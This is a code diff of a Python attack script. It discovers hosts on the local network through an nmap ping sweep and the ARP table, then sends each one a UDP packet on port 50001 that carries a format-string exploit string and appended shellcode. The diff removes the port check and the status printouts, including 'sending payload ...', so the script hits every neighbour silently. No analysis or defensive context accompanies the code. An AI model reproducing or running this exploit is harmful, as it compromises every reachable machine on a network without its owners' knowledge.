@@ -14,25 +14,12 @@ import subprocess
 import ipaddress
 import re
 
-# Function to check if a port is open on a given IP
-def is_port_open(ip, port):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(1)  # Timeout of 1 second
-    try:
-        sock.connect((ip, port))
-        return True
-    except (socket.timeout, socket.error):
-        return False
-    finally:
-        sock.close()
-
 def ping_sweep(network):
     # Run nmap for a ping sweep
     try:
         output = subprocess.check_output(['nmap', '-sn', network], text=True)
         return output
     except subprocess.CalledProcessError as e:
-        print(f"An error occurred while running nmap: {e.output}")
         return ""
 
 # Function to get the network and subnet mask of the primary interface
@@ -129,11 +116,8 @@ try:
     interface = get_interface()
     port = 50001  # Define the port to scan
     neighbors = get_arp_neighbors(interface)
-    print(neighbors)
 
     for ip in neighbors:
-        print(f"IP: {ip}, Port: {port} is open.")
-        print('sending payload ...')
         p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(p, (ip, port))
